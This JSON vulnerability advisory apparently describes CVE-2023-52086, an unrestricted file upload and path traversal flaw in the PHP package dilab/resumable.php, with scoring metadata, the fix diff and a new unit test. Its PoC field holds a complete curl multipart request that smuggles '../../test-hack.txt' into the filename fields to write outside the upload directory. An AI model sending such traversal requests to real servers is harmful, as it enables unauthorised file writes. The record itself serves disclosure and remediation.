@@ -1,0 +1,79 @@
+{
+    "CVSSv3": {
+        "CVSS": "3.1",
+        "E": "P",
+        "attackVector": "NETWORK",
+        "attackComplexity": "LOW",
+        "privilegesRequired": "NONE",
+        "userInteraction": "NONE",
+        "scope": "CHANGED",
+        "confidentiality": "NONE",
+        "integrity": "HIGH",
+        "availability": "NONE"
+    },
+    "credit": [
+        "William Desportes"
+    ],
+    "cvssDetails": [
+        {
+            "assigner": "NVD",
+            "cvssV3BaseScore": 8.1,
+            "cvssV3Vector": {
+                "CVSS": "3.1",
+                "attackVector": "NETWORK",
+                "attackComplexity": "HIGH",
+                "privilegesRequired": "NONE",
+                "userInteraction": "NONE",
+                "scope": "UNCHANGED",
+                "confidentiality": "HIGH",
+                "integrity": "HIGH",
+                "availability": "HIGH"
+            },
+            "severity": "high"
+        }
+    ],
+    "cvssScore": 8.6,
+    "disclosureTime": "2023-12-26 19:43:39",
+    "epssDetails": {
+        "modelVersion": "v2023.03.01",
+        "percentile": "0.24275",
+        "probability": "0.00061"
+    },
+    "exploitMaturity": "Proof of Concept",
+    "id": "SNYK-PHP-DILABRESUMABLEPHP-6139933",
+    "identifiers": {
+        "CVE": [
+            "CVE-2023-52086"
+        ],
+        "CWE": [
+            "CWE-434"
+        ]
+    },
+    "language": "php",
+    "malicious": false,
+    "packageManager": "composer",
+    "publicationTime": "2023-12-27 18:20:40",
+    "remediation": "A fix was pushed into the master branch but not yet published. ",
+    "severity": "high",
+    "socialTrendAlert": false,
+    "title": "Unrestricted Upload of File with Dangerous Type",
+    "vulnDescription": {
+        "Overview": "Affected versions of this package are vulnerable to Unrestricted Upload of File with Dangerous Type via specially crafted multipart/form-data content. An attacker can upload arbitrary files to any location on the server by exploiting this vulnerability. Note: It is not possible to overwrite files after version 0.1.4 because of #27 ",
+        "PoC": " curl 'https://example.org/upload.php?resumableChunkNumber=1&resumableChunkSize=1048576&resumableCurrentChunkSize=80881&resumableTotalSize=80881&resumableType=&resumableIdentifier=80881-resumablejsmap&resumableFileCategory=default&resumableFilename=../test.txt&resumableRelativePath=../../test-hack.txt&resumableTotalChunks=1' \\ -H 'content-type: multipart/form-data; boundary=----WebKitFormBoundaryBAX4owzrRwdmveis' \\ --data-raw $'------WebKitFormBoundaryBAX4owzrRwdmveis\\r\\nContent-Disposition: form-data; name=\"resumableChunkNumber\"\\r\\n\\r\\n1\\r\\n------WebKitFormBoundaryBAX4owzrRwdmveis\\r\\nContent-Disposition: form-data; name=\"resumableChunkSize\"\\r\\n\\r\\n1048576\\r\\n------WebKitFormBoundaryBAX4owzrRwdmveis\\r\\nContent-Disposition: form-data; name=\"resumableCurrentChunkSize\"\\r\\n\\r\\n80881\\r\\n------WebKitFormBoundaryBAX4owzrRwdmveis\\r\\nContent-Disposition: form-data; name=\"resumableTotalSize\"\\r\\n\\r\\n80881\\r\\n------WebKitFormBoundaryBAX4owzrRwdmveis\\r\\nContent-Disposition: form-data; name=\"resumableType\"\\r\\n\\r\\n\\r\\n------WebKitFormBoundaryBAX4owzrRwdmveis\\r\\nContent-Disposition: form-data; name=\"resumableIdentifier\"\\r\\n\\r\\n80881-resumablejsmap\\r\\n------WebKitFormBoundaryBAX4owzrRwdmveis\\r\\nContent-Disposition: form-data; name=\"resumableFileCategory\"\\r\\n\\r\\ndefault\\r\\n------WebKitFormBoundaryBAX4owzrRwdmveis\\r\\nContent-Disposition: form-data; name=\"resumableFilename\"\\r\\n\\r\\n../../test-hack.txt\\r\\n------WebKitFormBoundaryBAX4owzrRwdmveis\\r\\nContent-Disposition: form-data; name=\"resumableRelativePath\"\\r\\n\\r\\n../../test-hack.txt\\r\\n------WebKitFormBoundaryBAX4owzrRwdmveis\\r\\nContent-Disposition: form-data; name=\"resumableTotalChunks\"\\r\\n\\r\\n1\\r\\n------WebKitFormBoundaryBAX4owzrRwdmveis\\r\\nContent-Disposition: form-data; name=\"file\"; filename=\"../../test-hack.txt\"\\r\\nContent-Type: application/octet-stream\\r\\n\\r\\ntestok\\r\\n------WebKitFormBoundaryBAX4owzrRwdmveis--\\r\\n' \\--compressed "
+    },
+    "source_code": [
+        {
+            "filename": "composer.json",
+            "diff": "@@ -10,7 +10,8 @@\n   \"require\": {\n     \"php\": \">=8.1.0\",\n     \"cakephp/filesystem\": \"^3.0\",\n-    \"monolog/monolog\": \"^2.0\"\n+    \"monolog/monolog\": \"^2.0\",\n+    \"ondrej-vrto/php-filename-sanitize\": \"^1.4\"\n   },\n   \"require-dev\": {\n     \"phpunit/phpunit\": \"~10.0\""
+        },
+        {
+            "filename": "src/Resumable.php",
+            "diff": "@@ -8,6 +8,7 @@\n use Dilab\\Network\\Response;\n use Monolog\\Logger;\n use Monolog\\Handler\\StreamHandler;\n+use OndrejVrto\\FilenameSanitize\\FilenameSanitize;\n \n class Resumable\n {\n@@ -159,18 +160,14 @@ public function getExtension()\n     }\n \n     /**\n-     * Makes sure the orginal extension never gets overriden by user defined filename.\n+     * Creates a safe name\n      *\n-     * @param string User defined filename\n-     * @param string Original filename\n-     * @return string Filename that always has an extension from the original file\n+     * @param string $name Original name\n+     * @return string A safer name\n      */\n-    private function createSafeFilename($filename, $originalFilename)\n+    private function createSafeName(string $name): string\n     {\n-        $filename = $this->removeExtension($filename);\n-        $extension = $this->findExtension($originalFilename);\n-\n-        return sprintf('%s.%s', $filename, $extension);\n+        return FilenameSanitize::of($name)->get();\n     }\n \n     public function handleTestChunk()\n@@ -227,9 +224,9 @@ private function createFileAndDeleteTmp($identifier, $filename)\n \n         // if the user has set a custom filename\n         if (null !== $this->filename) {\n-            $finalFilename = $this->createSafeFilename($this->filename, $filename);\n+            $finalFilename = $this->createSafeName($this->filename);\n         } else {\n-            $finalFilename = $filename;\n+            $finalFilename = $this->createSafeName($filename);\n         }\n \n         // replace filename reference by the final file\n@@ -288,7 +285,7 @@ public function tmpChunkDir($identifier)\n         if (!empty($this->instanceId)){\n             $tmpChunkDir .= $this->instanceId . DIRECTORY_SEPARATOR;\n         }\n-        $tmpChunkDir .= $identifier;\n+        $tmpChunkDir .= $this->createSafeName($identifier);\n         $this->ensureDirExists($tmpChunkDir);\n         return $tmpChunkDir;\n     }\n@@ -318,7 +315,7 @@ private function ensureDirExists($path)\n \n     public function tmpChunkFilename($filename, $chunkNumber)\n     {\n-        return $filename . '.' . str_pad($chunkNumber, 4, 0, STR_PAD_LEFT);\n+        return $this->createSafeName($filename) . '.' . str_pad($chunkNumber, 4, 0, STR_PAD_LEFT);\n     }\n \n     public function getExclusiveFileHandle($name)"
+        },
+        {
+            "filename": "test/src/ResumableTest.php",
+            "diff": "@@ -235,6 +235,55 @@ public function testTmpChunkFile()\n         $this->assertEquals($expected, $this->resumbable->tmpChunkFilename($filename,$chunkNumber));\n     }\n \n+    public static function fileNameProvider(): array\n+    {\n+        return [\n+            ['example-file.png', 'example-file.png'],\n+            ['../unsafe-one-level.txt', 'unsafe-one-level.txt'],\n+        ];\n+    }\n+\n+    /**\n+     * @dataProvider fileNameProvider\n+     */\n+    public function testResumableSanitizeFileName(string $filename, string $filenameSanitized): void\n+    {\n+        $resumableParams = array(\n+            'resumableChunkNumber'=> 1,\n+            'resumableTotalChunks'=> 1,\n+            'resumableChunkSize'=>  200,\n+            'resumableIdentifier'=> 'identifier',\n+            'resumableFilename'=> $filename,\n+            'resumableRelativePath'=> 'upload',\n+        );\n+\n+\n+        $this->request->method('is')\n+            ->willReturn(true);\n+\n+        $this->request->method('data')\n+                ->willReturn($resumableParams);\n+\n+        $this->request->method('file')\n+                ->willReturn(array(\n+                    'name'=> 'mock.png',\n+                    'tmp_name'=>  'test/files/mock.png.0003',\n+                    'error'=> 0,\n+                    'size'=> 27000,\n+                ));\n+\n+        $this->resumbable = new Resumable($this->request, $this->response);\n+        $this->resumbable->tempFolder = 'test/tmp';\n+        $this->resumbable->uploadFolder = 'test/uploads';\n+        $this->resumbable->deleteTmpFolder = false;\n+        $this->resumbable->handleChunk();\n+\n+        $this->assertFileExists('test/uploads/' . $filenameSanitized);\n+        $this->assertFileExists('test/tmp/identifier/' . $filenameSanitized . '.0001');\n+        $this->assertTrue(unlink('test/tmp/identifier/' . $filenameSanitized . '.0001'));\n+        $this->assertTrue(unlink('test/uploads/' . $filenameSanitized));\n+    }\n+\n     public function testCreateFileFromChunks()\n     {\n         $files = array("
+        }
+    ],
+    "commitTime": "2023-12-17 03:05:25"
+}
